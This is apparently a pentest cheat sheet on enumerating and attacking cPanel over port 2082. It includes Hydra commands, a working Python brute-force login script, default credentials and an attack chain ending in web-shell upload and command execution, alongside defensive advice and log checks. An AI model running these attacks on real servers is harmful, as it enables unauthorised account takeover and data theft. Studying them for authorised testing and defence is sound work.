# CPANEL HTTP ENUMERATION (Port 2082/TCP)

## SERVICE OVERVIEW
```
cPanel HTTP - Web hosting control panel (unencrypted)
- Port: 2082/TCP (HTTP - unencrypted)
- Port: 2083/TCP (HTTPS - encrypted)
- Popular web hosting management interface
- Used by shared hosting providers
- Contains sensitive account information
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p2082 <IP>                            # Service/Version detection
curl -I http://<IP>:2082/                       # HTTP headers
curl -v http://<IP>:2082/                       # Verbose connection
wget --spider http://<IP>:2082/                 # Check availability
```

## NMAP ENUMERATION
```bash
# cPanel detection
nmap -sV -p2082,2083 <IP>                       # Both HTTP and HTTPS
nmap -p2082 --script http-title <IP>            # Get page title
nmap -p2082 --script http-headers <IP>          # HTTP headers

# Comprehensive web scan
nmap -sV -p2082,2083 --script "http-*" <IP> -oA cpanel_scan
```

## WEB INTERFACE ACCESS
```bash
# Access cPanel login page
http://<IP>:2082/                               # Main page
http://<IP>:2082/login/                         # Login page
http://<IP>:2083/                               # HTTPS (secure)

# Common cPanel URLs
http://<IP>:2082/cpsess<session>/              # Active session
http://<IP>:2082/logout/                        # Logout page
http://<IP>:2082/frontend/<theme>/              # Theme files
```

## ENUMERATE CPANEL VERSION
```bash
# Get cPanel version from headers
curl -I http://<IP>:2082/ | grep -i "server\|cpanel"

# Version disclosure endpoints
curl http://<IP>:2082/cgi-sys/guestbook.cgi
curl http://<IP>:2082/cgi-sys/defaultwebpage.cgi

# Check for version in HTML
curl -s http://<IP>:2082/ | grep -i "version\|cpanel"

# Nmap detection
nmap -sV -p2082 <IP> | grep -i cpanel
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l admin -P passwords.txt <IP> http-post-form "/login/:user=^USER^&pass=^PASS^:F=incorrect" -s 2082

# WPScan (if WordPress is hosted)
wpscan --url http://<IP>:2082/wordpress -e u --passwords passwords.txt

# Custom brute force script
cat > cpanel_brute.py <<'EOF'
#!/usr/bin/env python3
import requests
import sys

def brute_force(ip, user, password_file):
    url = f"http://{ip}:2082/login/"
    with open(password_file) as f:
        for password in f:
            password = password.strip()
            data = {'user': user, 'pass': password}
            r = requests.post(url, data=data, allow_redirects=False)
            if r.status_code == 302 or "success" in r.text.lower():
                print(f"[+] Success: {user}:{password}")
                return
            else:
                print(f"[-] Failed: {password}")

if __name__ == "__main__":
    brute_force(sys.argv[1], sys.argv[2], sys.argv[3])
EOF

python3 cpanel_brute.py <IP> root passwords.txt
```

## DEFAULT CREDENTIALS
```bash
# Common cPanel default/weak credentials:
root:<blank>
root:root
root:password
root:cpanel
admin:admin
admin:password
cpanel:cpanel

# Try defaults
curl -X POST http://<IP>:2082/login/ -d "user=root&pass=password"
```

## ENUMERATE HOSTED DOMAINS
```bash
# DNS enumeration to find hosted domains
dig @<IP> any <domain>
dig @<IP> axfr <domain>                         # Zone transfer

# Reverse IP lookup (find all domains on server)
# Use online tools or APIs:
# - https://viewdns.info/reverseip/
# - SecurityTrails API
# - Shodan

# Check /etc/trueuserdomains (if shell access)
cat /etc/trueuserdomains
# Format: domain: username

# Check /var/cpanel/users/ (if shell access)
ls -la /var/cpanel/users/
```

## COMMON CPANEL PATHS
```bash
# cPanel directories and files
/usr/local/cpanel/                              # cPanel installation
/var/cpanel/                                    # Config and user data
/home/*/public_html/                            # User websites
/etc/trueuserdomains                            # Domain to user mapping
/var/cpanel/users/                              # User configs

# Web-accessible paths
http://<IP>:2082/cgi-sys/
http://<IP>:2082/frontend/
http://<IP>:2082/3rdparty/
http://<IP>:2082/robots.txt
http://<IP>:2082/.well-known/

# Check for exposed files
curl http://<IP>:2082/cgi-sys/defaultwebpage.cgi
curl http://<IP>:2082/bandwidth/
```

## VULNERABILITY SCANNING
```bash
# Search for cPanel exploits
searchsploit cpanel

# Known vulnerabilities:
# CVE-2021-45467: cPanel Privilege Escalation
# CVE-2020-29109: cPanel DNS Zone Editor XSS
# CVE-2019-1010034: cPanel CSRF
# CVE-2018-11388: cPanel Unauthorized API Access

# Nmap vuln scan
nmap -p2082 --script http-vuln-* <IP>

# Nikto scan
nikto -h http://<IP>:2082/
```

## POST-AUTHENTICATION ENUMERATION
```bash
# After successful login:

# File Manager
http://<IP>:2082/cpsess<ID>/frontend/<theme>/filemanager/index.html

# Email accounts
http://<IP>:2082/cpsess<ID>/frontend/<theme>/mail/pops.html

# Databases
http://<IP>:2082/cpsess<ID>/frontend/<theme>/sql/index.html

# FTP accounts
http://<IP>:2082/cpsess<ID>/frontend/<theme>/ftp/accounts.html

# Backup
http://<IP>:2082/cpsess<ID>/frontend/<theme>/backup/index.html

# Terminal (if enabled)
http://<IP>:2082/cpsess<ID>/frontend/<theme>/terminal/index.html
```

## API ACCESS (UAPI/API2)
```bash
# cPanel has API access
# Requires authentication token or username:password

# UAPI (modern)
curl -H "Authorization: cpanel username:password" \
  "https://<IP>:2083/execute/Email/list_pops"

# API2 (legacy)
curl -u username:password \
  "https://<IP>:2083/json-api/cpanel?cpanel_jsonapi_user=username&cpanel_jsonapi_module=Email&cpanel_jsonapi_func=listpops"

# WHM API (for root/reseller)
curl -H "Authorization: whm root:password" \
  "https://<IP>:2087/json-api/listaccts"
```

## COMMON MISCONFIGURATIONS
```
☐ cPanel accessible over HTTP (port 2082, not 2083)
☐ Default/weak root password
☐ Outdated cPanel version with known vulnerabilities
☐ cPanel exposed to internet (should be VPN/IP-restricted)
☐ No two-factor authentication (2FA)
☐ Weak passwords for hosting accounts
☐ Terminal access enabled for all users
☐ No rate limiting on login attempts
☐ Verbose error messages revealing version/config
☐ Backup files accessible via web
```

## QUICK WIN CHECKLIST
```
☐ Scan for cPanel on ports 2082/2083
☐ Identify cPanel version from headers/HTML
☐ Test default credentials (root:root, root:password)
☐ Brute force root account
☐ Check for known vulnerabilities (searchsploit)
☐ Enumerate hosted domains (reverse IP lookup)
☐ Access File Manager after login
☐ Download backups if accessible
☐ Check for database credentials
☐ Look for SSH access (Terminal feature)
☐ Enumerate email accounts
```

## ONE-LINER ENUMERATION
```bash
# Quick cPanel detection and version
curl -I http://<IP>:2082/ | grep -i "server\|cpanel"

# Full page source for version
curl -s http://<IP>:2082/ | grep -i "cpanel\|version"
```

## SECURITY IMPLICATIONS
```
RISKS:
- Full hosting account compromise (root access)
- Access to all hosted websites
- Database credentials exposure
- Email account access (read emails, send phishing)
- File system access (upload web shells)
- SSH access via Terminal feature
- Backup downloads (entire account data)
- DNS management (subdomain takeover)

POST-COMPROMISE:
- Upload web shells to hosted sites
- Modify DNS records (phishing, redirects)
- Access databases (steal data)
- Read email (credentials, sensitive info)
- Create FTP accounts (persistence)
- Download full backups (offline analysis)
- Use as pivot point to internal network

RECOMMENDATIONS:
- Use HTTPS only (port 2083, not 2082)
- Implement strong passwords + 2FA
- Restrict cPanel access to trusted IPs
- Keep cPanel updated to latest version
- Disable Terminal access unless needed
- Enable cPHulk (brute force protection)
- Regular security audits
- Monitor access logs
- Use Web Application Firewall (WAF)
- Implement account lockout policy
```

## CPANEL THEMES
```bash
# cPanel uses different themes over time
# Theme affects URL paths

Common themes:
- paper_lantern (modern, current)
- x3 (legacy)
- jupiter (legacy)

# Theme detection
curl -s http://<IP>:2082/ | grep -i "theme"

# Access based on theme
http://<IP>:2082/frontend/paper_lantern/
http://<IP>:2082/frontend/x3/
```

## TOOLS
```bash
# cURL
curl -I http://<IP>:2082/

# Nmap
nmap -sV -p2082,2083 --script "http-*" <IP>

# Nikto
nikto -h http://<IP>:2082/

# Hydra
hydra -l root -P passwords.txt <IP> http-post-form "/login/:user=^USER^&pass=^PASS^:F=incorrect" -s 2082

# WPScan (if WordPress hosted)
wpscan --url http://<IP>:2082/site -e u

# searchsploit
searchsploit cpanel
```

## CPANEL VS WHM
```
cPanel:
- Port 2082 (HTTP), 2083 (HTTPS)
- Individual account management
- For end-users/site owners
- File Manager, Email, Databases

WHM (WebHost Manager):
- Port 2086 (HTTP), 2087 (HTTPS)
- Server-wide management
- For root/resellers
- Create/manage cPanel accounts
- Server configuration

Relationship:
- WHM manages cPanel accounts
- Root access to WHM = access to all cPanel accounts
- 1 WHM server = multiple cPanel accounts
```

## DEFENSE DETECTION
```bash
# Monitor for cPanel attacks:
# - Multiple failed login attempts
# - Logins from unusual IPs/countries
# - API requests from unauthorized sources
# - Backup downloads
# - File uploads to public_html

# cPanel logs
tail -f /usr/local/cpanel/logs/access_log
tail -f /usr/local/cpanel/logs/error_log
tail -f /usr/local/cpanel/logs/login_log

# Check for failed logins
grep "FAILED LOGIN" /usr/local/cpanel/logs/login_log

# cPHulk brute force protection logs
tail -f /usr/local/cpanel/logs/cphulkd.log
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Attack chain:

# 1. Discover cPanel
nmap -sV -p2082,2083 <IP>

# 2. Brute force login
hydra -l root -P passwords.txt <IP> http-post-form "/login/:user=^USER^&pass=^PASS^:F=incorrect" -s 2082

# 3. After successful login:
# - Access File Manager
# - Upload web shell to public_html

# 4. Web shell access
curl http://<IP>/shell.php?cmd=whoami

# 5. Upgrade to full shell
# - Create SSH account via Terminal
# - Or reverse shell via web shell

# 6. Enumerate hosted sites
cat /etc/trueuserdomains

# 7. Access databases
mysql -u cpanel_user -p database_name

# 8. Lateral movement
# - Check for other servers in network
# - Use cPanel as pivot point
```

## REFERENCE - CPANEL HTTPS (PORT 2083)
```bash
# For encrypted cPanel access, see:
# SERVICE ENUM/2083 cPanel HTTPS.md

# All techniques for 2082 apply to 2083
# Simply use HTTPS instead of HTTP:
https://<IP>:2083/
```
